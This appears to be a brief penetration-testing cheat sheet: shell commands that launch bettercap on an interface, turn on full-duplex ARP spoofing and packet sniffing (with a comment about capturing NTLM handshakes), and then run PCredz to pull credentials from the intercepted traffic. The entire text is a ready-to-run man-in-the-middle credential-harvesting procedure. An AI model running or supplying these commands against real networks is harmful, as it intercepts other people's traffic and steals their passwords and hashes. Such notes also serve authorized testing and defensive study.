
#Launch bettercap
sudo bettercap -iface enp0s3
> get arp.spoof.*
> (arp.spoof.fullduplex true) #if you want to capture ntlm handshakes or server responses in general
> arp.spoof on
> net.sniff on

#Launch PCredz
sudo python3 /opt/outils/reseau/analyse/PCredz/Pcredz -i enp0s3
